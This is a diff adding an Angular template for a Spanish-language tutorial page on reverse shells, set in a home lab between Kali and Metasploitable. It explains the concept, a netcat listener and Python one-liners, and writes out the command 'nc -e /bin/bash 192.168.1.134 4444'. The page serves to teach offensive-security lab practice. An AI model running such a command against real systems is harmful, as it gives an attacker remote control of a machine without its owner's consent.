@@ -1,0 +1,140 @@
+<style>
+    p {
+        font-size: 18px;
+    }
+    .container {
+        text-align: left; /* Centra el contenido horizontalmente */
+    }
+</style>
+
+<p-header>
+    <h1>Shell reversa</h1>
+</p-header>
+
+<hr>
+<br>
+<div class="panel-wrapper">
+    <p-panel>
+        <ng-template pTemplate="header">
+            <div class="header-container">
+              <h4>Que es una shell reversa</h4>
+            </div>
+        </ng-template>
+        <p>
+            Una shell reversa es una técnica utilizada en seguridad informática donde un atacante obtiene acceso remoto a un sistema comprometido 
+            y establece una conexión desde la máquina comprometida hacia el atacante. Esto permite al atacante ejecutar comandos en el sistema comprometido 
+            como si estuviera físicamente presente en él, lo que le brinda un control total sobre el sistema.
+        </p>  
+        <p>
+            La revershell suele ser nuestro objetivo principal dentro de la fase de explotacion
+        </p>
+        <p>
+            En resumen, una shell reversa es una forma de acceso remoto que permite a un atacante controlar un sistema comprometido de manera remota. 
+            Esto puede ser utilizado para realizar actividades maliciosas como robo de datos, instalación de malware, manipulación de archivos, entre otros. 
+            Es una herramienta comúnmente utilizada en ciberataques.
+        </p>  
+
+        <img src="assets/conceptos/revershell/rever.PNG"><br><br>
+        <p>
+            A la shell reversa se le suele llamar, revershell, revshell, o simplemente rever
+        </p>
+        <p-panel  [toggleable]="true">
+            <ng-template pTemplate="header">
+                <div class="header-container">
+                  <h4>Como conseguir una revershell</h4>
+                </div>
+            </ng-template>
+            <p>
+                Hay muchas formas de conseguir una shell reversa en la maquina objetivo. Tenemos desde <strong>remota de comandos (RCE)</strong> , 
+                <strong>one-liners</strong> , <strong>scripts</strong> , etc.. 
+            </p>  
+            <p>
+               Primero, para entender bien como es una rever, y lo que conseguimos con ella, vamos a lanzarnos directamente una conexión TCP desde una maquina virtual a otra
+            </p>  
+            <br><h3>Rever basica</h3><br>
+            <p>
+                Tenemos nuestra maquina 1 (Kali linux) con la direccion IP <strong>192.168.1.134</strong>
+            </p> 
+            <img src="assets/conceptos/revershell/kali.PNG"><br><br>
+            <p>
+                Y nuestra maquina 2 (metasploitable) con la direccion IP <strong>192.168.1.130</strong>
+            </p> 
+            <img src="assets/conceptos/revershell/metasploitable2.PNG"><br><br>
+            <br><h4>Que necesitamos?</h4><br>
+            <p>
+                Para poder establecer esata conexion TCP, necesitamos que nuestro equipo atacante (Kali), esté en <strong>"escucha"</strong> sobre un puerto cualquiera que no este ocupado
+            </p> 
+            <p>
+                Estar en escucha significa que nuestro equipo va a estar esperando conexiones externas entrantes
+            </p> 
+            <p>
+                Para ello vamos a utilizar la herramienta <strong>Netcat (nc)</strong>
+            </p>
+            <img src="assets/conceptos/revershell/ncSetup.PNG"><br><br>
+            <p>
+                Como podemos ver, la terminal se ha quedado escuchando en el puerto que le hemos especificado al comando <strong>nc</strong>
+            </p>
+            <p>
+                Una vez tengamos netcat preparado, vamos a lanzar el siguiente comando desde la maquina 2 para establecer la conexión
+            </p>
+            <pre class="nc"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.nc')" class="copy-button"></button><br><hr><code class="language-console">{{ nc }}</code></pre>
+            <p>
+                Al ejecutar este comando, vemos como en la sesion de netcat de nuestra maquina kali nos ha llegado la conexion reversa.
+            </p>
+            <p>
+                Si probamos a lanzar comandos como <strong>whoami</strong> o <strong>ifocnfig</strong>, vemos que nos devuelve la informacion de la segunda maquina
+            </p>
+            <p>
+                En definitiva, estamos lanzado comandos de forma remota en la segunda maquina desde nuestra kali
+            </p>
+            <img src="assets/conceptos/revershell/reverOk.PNG"><br><br>
+            <p>
+                A continuacion, vamos a empezar a ver formas de como conseguir esta rever, empezando por los one-liner
+            </p>
+            <p-panel  [toggleable]="true">
+                <ng-template pTemplate="header">
+                    <div class="header-container">
+                      <h4>One-Liner</h4>
+                    </div>
+                </ng-template>
+                <p>
+                    Un one-liner es cuando se consigue la ejecucucion esperada en una sola linea
+                </p>
+                <p>
+                    Aprendiendo como crear una rever simple, ya hemos utilizado un one-liner con el comando netcat al enviar la conexion: <strong>nc -e /bin/bash 192.168.1.134 4444</strong>
+                </p>
+                <p>
+                    Hemos conseguido la rever utilizando una unica linea
+                </p>
+                <p>
+                    Podemos crear one-liners de diferentes formas, lo unico que vamos a necesitar para que se pueda ejecutar, es que la maquina victima tenga la tecnologia instalada.
+                </p>
+                <p>
+                    Por ejemplo, si queremos crear un one-liner con python, necesitamos que la maquina victima tenga python instalado.
+                </p>
+                <p>
+                    Ademas, necesitamos poder ejecutar comandos en la maquina victima previamente
+                </p>
+                <br><h3>Python</h3><br>
+                <p>
+                    Vamos a ver un ejemplo de one-liner mediante python.
+                </p>
+                <p>
+                    Como hemos comentado antes, necesitamos saber si la victima tinene instalada esta tecnologia, para ello podemos utilizar el comando <strong>which</strong>
+                </p>
+                <pre class="which"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.which')" class="copy-button"></button><br><hr><code class="language-console">{{ which }}</code></pre>
+                <p>
+                    Lanzando el comando en la victima, vemos que efectivamente lo tiene instalado
+                </p>
+                <img src="assets/conceptos/revershell/whickPython.PNG"><br><br>
+                <p>
+                    En este punto, podemos lanzar el siguiente comando para mandarnos la rever desde la victima
+                </p>
+                <pre class="pythonRever"><strong>{{codigo}}</strong><button pButton type="button" icon="pi pi-copy" (click)="copyContent('.pythonRever')" class="copy-button"></button><br><hr><code class="language-python">{{ pythonRever }}</code></pre>
+                <p>
+                    Simplemente tenemos que adaptar el comando y poner nuestra ip y puerto
+                </p>
+            </p-panel>
+        </p-panel>
+    </p-panel>
+</div>
